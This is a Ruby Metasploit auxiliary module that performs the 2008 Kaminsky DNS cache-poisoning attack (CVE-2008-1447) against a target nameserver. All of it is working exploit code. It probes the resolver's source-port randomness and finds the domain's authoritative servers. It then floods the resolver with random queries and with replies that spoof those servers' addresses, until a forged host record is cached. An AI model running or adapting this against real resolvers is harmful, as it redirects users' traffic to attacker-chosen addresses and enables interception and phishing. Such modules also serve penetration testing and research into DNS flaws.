##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'net/dns'
require 'resolv'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Capture

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DNS BailiWicked Host Attack',
      'Description'    => %q{
        This exploit attacks a fairly ubiquitous flaw in DNS implementations which
        Dan Kaminsky found and disclosed ~Jul 2008.  This exploit caches a single
        malicious host entry into the target nameserver by sending random hostname
        queries to the target DNS server coupled with spoofed replies to those
        queries from the authoritative nameservers for that domain. Eventually, a
        guessed ID will match, the spoofed packet will get accepted, and due to the
        additional hostname entry being within bailiwick constraints of the original
        request the malicious host entry will get cached.
      },
      'Author'         => [ 'I)ruid', 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2008-1447' ],
          [ 'OSVDB', '46776'],
          [ 'US-CERT-VU', '800113' ],
          [ 'URL', 'http://www.caughq.org/exploits/CAU-EX-2008-0002.txt' ],
        ],
      'DisclosureDate' => 'Jul 21 2008'
      ))

      register_options(
        [
          OptEnum.new('SRCADDR', [true, 'The source address to use for sending the queries', 'Real', ['Real', 'Random'], 'Real']),
          OptPort.new('SRCPORT', [true, "The target server's source query port (0 for automatic)", nil]),
          OptString.new('HOSTNAME', [true, 'Hostname to hijack', 'pwned.example.com']),
          OptAddress.new('NEWADDR', [true, 'New address for hostname', '1.3.3.7']),
          OptAddress.new('RECONS', [true, 'The nameserver used for reconnaissance', '208.67.222.222']),
          OptInt.new('XIDS', [true, 'The number of XIDs to try for each query (0 for automatic)', 0]),
          OptInt.new('TTL', [true, 'The TTL for the malicious host entry', rand(20000)+30000]),

        ], self.class)

      deregister_options('FILTER','PCAPFILE')

  end

  def auxiliary_commands
    return {
      "racer" => "Determine the size of the window for the target server"
    }
  end

  def cmd_racer(*args)
    targ = args[0] || rhost()
    dom  = args[1] || "example.com"

    if !(targ and targ.length > 0)
      print_status("usage: racer [dns-server] [domain]")
      return
    end

    calculate_race(targ, dom)
  end

  def check
    targ = rhost

    srv_sock = Rex::Socket.create_udp(
      'PeerHost' => targ,
      'PeerPort' => 53
    )

    random = false
    ports  = {}
    lport  = nil
    reps   = 0

    1.upto(30) do |i|

      req = Resolv::DNS::Message.new
      txt = "spoofprobe-check-#{i}-#{$$}#{(rand()*1000000).to_i}.red.metasploit.com"
      req.add_question(txt, Resolv::DNS::Resource::IN::TXT)
      req.rd = 1

      srv_sock.put(req.encode)
      res, addr = srv_sock.recvfrom(65535, 1.0)


      if res and res.length > 0
        reps += 1
        res = Resolv::DNS::Message.decode(res)
        res.each_answer do |name, ttl, data|
          if (name.to_s == txt and data.strings.join('') =~ /^([^\s]+)\s+.*red\.metasploit\.com/m)
            t_addr, t_port = $1.split(':')

            vprint_status(" >> ADDRESS: #{t_addr}  PORT: #{t_port}")
            t_port = t_port.to_i
            if(lport and lport != t_port)
              random = true
            end
            lport  = t_port
            ports[t_port] ||=0
            ports[t_port]  +=1
          end
        end
      end


      if(i>5 and ports.keys.length == 0)
        break
      end
    end

    srv_sock.close

    if(ports.keys.length == 0)
      vprint_error("ERROR: This server is not replying to recursive requests")
      return Exploit::CheckCode::Unknown
    end

    if(reps < 30)
      vprint_warning("WARNING: This server did not reply to all of our requests")
    end

    if(random)
      ports_u = ports.keys.length
      ports_r = ((ports.keys.length/30.0)*100).to_i
      print_status("PASS: This server does not use a static source port. Randomness: #{ports_u}/30 %#{ports_r}")
      if(ports_r != 100)
        vprint_status("INFO: This server's source ports are not really random and may still be exploitable, but not by this tool.")
        # Not exploitable by this tool, so we lower this to Appears on purpose to lower the user's confidence
        return Exploit::CheckCode::Appears
      end
    else
      vprint_error("FAIL: This server uses a static source port and is vulnerable to poisoning")
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def run
    check_pcaprub_loaded # Check first.

    target   = rhost()
    source   = Rex::Socket.source_address(target)
    saddr    = datastore['SRCADDR']
    sport    = datastore['SRCPORT']
    hostname = datastore['HOSTNAME'] + '.'
    address  = datastore['NEWADDR']
    recons   = datastore['RECONS']
    xids     = datastore['XIDS'].to_i
    newttl   = datastore['TTL'].to_i
    xidbase  = rand(20001) + 20000
    numxids = xids

    domain = hostname.sub(/\w+\x2e/,"")

    srv_sock = Rex::Socket.create_udp(
      'PeerHost' => target,
      'PeerPort' => 53
    )

    # Get the source port via the metasploit service if it's not set
    if sport.to_i == 0
      req = Resolv::DNS::Message.new
      txt = "spoofprobe-#{$$}#{(rand()*1000000).to_i}.red.metasploit.com"
      req.add_question(txt, Resolv::DNS::Resource::IN::TXT)
      req.rd = 1

      srv_sock.put(req.encode)
      res, addr = srv_sock.recvfrom()

      if res and res.length > 0
        res = Resolv::DNS::Message.decode(res)
        res.each_answer do |name, ttl, data|
          if (name.to_s == txt and data.strings.join('') =~ /^([^\s]+)\s+.*red\.metasploit\.com/m)
            t_addr, t_port = $1.split(':')
            sport = t_port.to_i

            print_status("Switching to target port #{sport} based on Metasploit service")
            if target != t_addr
              print_status("Warning: target address #{target} is not the same as the nameserver's query source address #{t_addr}!")
            end
          end
        end
      end
    end

    # Verify its not already cached
    begin
      query = Resolv::DNS::Message.new
      query.add_question(hostname, Resolv::DNS::Resource::IN::A)
      query.rd = 0

      begin
        cached = false
        srv_sock.put(query.encode)
        answer, addr = srv_sock.recvfrom()

        if answer and answer.length > 0
          answer = Resolv::DNS::Message.decode(answer)
          answer.each_answer do |name, ttl, data|

            if((name.to_s + ".") == hostname)
              t = Time.now + ttl
              print_error("Failure: This hostname is already in the target cache: #{name}")
              print_error("         Cache entry expires on #{t}... sleeping.")
              cached = true
              select(nil,nil,nil,ttl)
            end
          end

        end
      end until not cached
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Error checking the DNS name: #{e.class} #{e} #{e.backtrace}")
    end

    res0 = Net::DNS::Resolver.new(:nameservers => [recons], :dns_search => false, :recursive => true) # reconnaissance resolver

    print_status "Targeting nameserver #{target} for injection of #{hostname} as #{address}"

    # Look up the nameservers for the domain
    print_status "Querying recon nameserver for #{domain}'s nameservers..."
    answer0 = res0.send(domain, Net::DNS::NS)
    #print_status " Got answer with #{answer0.header.anCount} answers, #{answer0.header.nsCount} authorities"

    barbs = [] # storage for nameservers
    answer0.answer.each do |rr0|
      print_status " Got an #{rr0.type} record: #{rr0.inspect}"
      if rr0.type == 'NS'
        print_status "  Querying recon nameserver for address of #{rr0.nsdname}..."
        answer1 = res0.send(rr0.nsdname) # get the ns's answer for the hostname
        #print_status " Got answer with #{answer1.header.anCount} answers, #{answer1.header.nsCount} authorities"
        answer1.answer.each do |rr1|
          print_status "   Got an #{rr1.type} record: #{rr1.inspect}"
          res2 = Net::DNS::Resolver.new(:nameservers => rr1.address, :dns_search => false, :recursive => false, :retry => 1)
          print_status "    Checking Authoritativeness: Querying #{rr1.address} for #{domain}..."
          answer2 = res2.send(domain, Net::DNS::SOA)
          if answer2 and answer2.header.auth? and answer2.header.anCount >= 1
            nsrec = {:name => rr0.nsdname, :addr => rr1.address}
            barbs << nsrec
            print_status "    #{rr0.nsdname} is authoritative for #{domain}, adding to list of nameservers to spoof as"
          end
        end
      end
    end

    if barbs.length == 0
      print_status( "No DNS servers found.")
      srv_sock.close
      close_pcap
      return
    end


    if(xids == 0)
      print_status("Calculating the number of spoofed replies to send per query...")
      qcnt = calculate_race(target, domain, 100)
      numxids = ((qcnt * 1.5) / barbs.length).to_i
      if(numxids == 0)
        print_status("The server did not reply, giving up.")
        srv_sock.close
        close_pcap
        return
      end
      print_status("Sending #{numxids} spoofed replies from each nameserver (#{barbs.length}) for each query")
    end

    # Flood the target with queries and spoofed responses, one will eventually hit
    queries = 0
    responses = 0


    open_pcap unless self.capture

    print_status( "Attempting to inject a poison record for #{hostname} into #{target}:#{sport}...")

    while true
      randhost = Rex::Text.rand_text_alphanumeric(rand(10)+10) + '.' + domain # randomize the hostname

      # Send spoofed query
      req = Resolv::DNS::Message.new
      req.id = rand(2**16)
      req.add_question(randhost, Resolv::DNS::Resource::IN::A)

      req.rd = 1

      src_ip = source

      if(saddr == 'Random')
        src_ip = Rex::Text.rand_text(4).unpack("C4").join(".")
      end

      p = PacketFu::UDPPacket.new
      p.ip_saddr = src_ip
      p.ip_daddr = target
      p.ip_ttl = 255
      p.udp_sport = (rand((2**16)-1024)+1024).to_i
      p.udp_dport = 53
      p.payload = req.encode
      p.recalc

      capture_sendto(p, target)

      queries += 1

      # Send evil spoofed answer from ALL nameservers (barbs[*][:addr])
      req.add_answer(randhost, newttl, Resolv::DNS::Resource::IN::A.new(address))
      req.add_authority(domain, newttl, Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create(hostname)))
      req.add_additional(hostname, newttl, Resolv::DNS::Resource::IN::A.new(address))
      req.qr = 1
      req.ra = 1

      # Reuse our PacketFu object
      p.udp_sport = 53
      p.udp_dport = sport.to_i

      xidbase.upto(xidbase+numxids-1) do |id|
        req.id = id
        p.payload = req.encode
        barbs.each do |barb|
          p.ip_saddr = barb[:addr].to_s
          p.recalc
          capture_sendto(p, target)
          responses += 1
        end
      end

      # status update
      if queries % 1000 == 0
        print_status("Sent #{queries} queries and #{responses} spoofed responses...")
        if(xids == 0)
          print_status("Recalculating the number of spoofed replies to send per query...")
          qcnt = calculate_race(target, domain, 25)
          numxids = ((qcnt * 1.5) / barbs.length).to_i
          if(numxids == 0)
            print_status("The server has stopped replying, giving up.")
            srv_sock.close
            close_pcap
            return
          end
          print_status("Now sending #{numxids} spoofed replies from each nameserver (#{barbs.length}) for each query")
        end
      end

      # every so often, check and see if the target is poisoned...
      if queries % 250 == 0
        begin
          query = Resolv::DNS::Message.new
          query.add_question(hostname, Resolv::DNS::Resource::IN::A)
          query.rd = 0

          srv_sock.put(query.encode)
          answer, addr = srv_sock.recvfrom()

          if answer and answer.length > 0
            answer = Resolv::DNS::Message.decode(answer)
            answer.each_answer do |name, ttl, data|
              if((name.to_s + ".") == hostname)
                print_status("Poisoning successful after #{queries} queries and #{responses} responses: #{name} == #{address}")
                print_status("TTL: #{ttl} DATA: #{data}")
                close_pcap
                return
              end
            end
          end
        rescue ::Interrupt
          raise $!
        rescue ::Exception => e
          print_error("Error querying the DNS name: #{e.class} #{e} #{e.backtrace}")
        end
      end
    end
  end

  #
  # Send a recursive query to the target server, then flood
  # the server with non-recursive queries for the same entry.
  # Calculate how many non-recursive queries we receive back
  # until the real server responds. This should give us a
  # ballpark figure for ns->ns latency. We can repeat this
  # a few times to account for each nameserver the cache server
  # may query for the target domain.
  #
  def calculate_race(server, domain, num=50)

    q_beg_t = nil
    q_end_t = nil
    cnt     = 0

    times   = []

    hostname = Rex::Text.rand_text_alphanumeric(rand(10)+10) + '.' + domain

    sock = Rex::Socket.create_udp(
      'PeerHost' => server,
      'PeerPort' => 53
    )


    req = Resolv::DNS::Message.new
    req.add_question(hostname, Resolv::DNS::Resource::IN::A)
    req.rd = 1
    req.id = 1

    q_beg_t = Time.now.to_f
    sock.put(req.encode)
    req.rd = 0

    while(times.length < num)
      res, addr = sock.recvfrom(65535, 0.01)

      if res and res.length > 0
        res = Resolv::DNS::Message.decode(res)

        if(res.id == 1)
          times << [Time.now.to_f - q_beg_t, cnt]
          cnt = 0

          hostname = Rex::Text.rand_text_alphanumeric(rand(10)+10) + '.' + domain

          sock.close
          sock = Rex::Socket.create_udp(
            'PeerHost' => server,
            'PeerPort' => 53
          )

          q_beg_t = Time.now.to_f
          req = Resolv::DNS::Message.new
          req.add_question(hostname, Resolv::DNS::Resource::IN::A)
          req.rd = 1
          req.id = 1

          sock.put(req.encode)
          req.rd = 0
        end

        cnt += 1
      end

      req.id += 1

      sock.put(req.encode)
    end

    min_time = (times.map{|i| i[0]}.min * 100).to_i / 100.0
    max_time = (times.map{|i| i[0]}.max * 100).to_i / 100.0
    sum       = 0
    times.each{|i| sum += i[0]}
    avg_time = (	(sum / times.length) * 100).to_i / 100.0

    min_count = times.map{|i| i[1]}.min
    max_count = times.map{|i| i[1]}.max
    sum       = 0
    times.each{|i| sum += i[1]}
    avg_count = sum / times.length

    sock.close

    print_status("  race calc: #{times.length} queries | min/max/avg time: #{min_time}/#{max_time}/#{avg_time} | min/max/avg replies: #{min_count}/#{max_count}/#{avg_count}")


    # XXX: We should subtract the timing from the target to us (calculated based on 0.50 of our non-recursive query times)
    avg_count
  end

end
